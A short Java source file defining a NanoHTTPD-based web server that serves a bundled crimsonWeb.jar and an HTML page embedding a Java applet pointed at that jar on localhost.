package subterranean.webserver;

import java.io.InputStream;

import subterranean.crimson.universal.Logger;
import webserver.NanoHTTPD;
import webserver.NanoHTTPD.Response.Status;

public class AppletServer extends NanoHTTPD {

	public AppletServer(int port) {
		super(port);

	}

	@Override
	public Response serve(IHTTPSession session) {
		Method method = session.getMethod();
		String uri = session.getUri();
		Logger.add("uri: " + uri);

		if (uri.contains("crimsonWeb.jar")) {
			Logger.add("Serving crimsonWeb.jar");
			// looking for the jar
			InputStream is = null;
			is = getClass().getResourceAsStream("/subterranean/webserver/crimsonWeb.jar");

			return new NanoHTTPD.Response(Status.OK, "application/java-archive", is);
		} else {
			Logger.add("Serving html file");
			// looking for the html file
			String main = "<!DOCTYPE html><html><body><applet code = 'subterranean.crimson.web.AppletInterface' archive = '127.0.0.1/crimsonWeb.jar' width = 600 height = 300></applet></body></html>";
			return new NanoHTTPD.Response(main);
		}

	}

}
